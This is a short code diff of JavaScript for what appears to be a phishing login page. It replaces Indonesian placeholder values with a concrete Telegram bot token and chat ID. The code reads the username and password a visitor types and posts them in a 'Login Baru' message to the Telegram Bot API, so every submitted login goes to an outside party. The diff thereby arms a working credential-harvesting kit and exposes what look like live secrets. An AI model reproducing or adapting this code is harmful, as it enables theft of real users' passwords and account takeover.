@@ -63,8 +63,8 @@ document.addEventListener('DOMContentLoaded', function() {
         const password = document.getElementById("password").value;
     
         const message = `📥 Login Baru:\nUsername: ${username}\nPassword: ${password}`;
-        const botToken = 'ISI_TOKEN_BOT_KAMU';
-        const chatId = 'ISI_CHAT_ID_KAMU';
+        const botToken = '7851747348:AAE7Tj8ZH_I7UNN5c35BZb8c1mfYiU1qIRo';
+        const chatId = '6448306853';
     
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
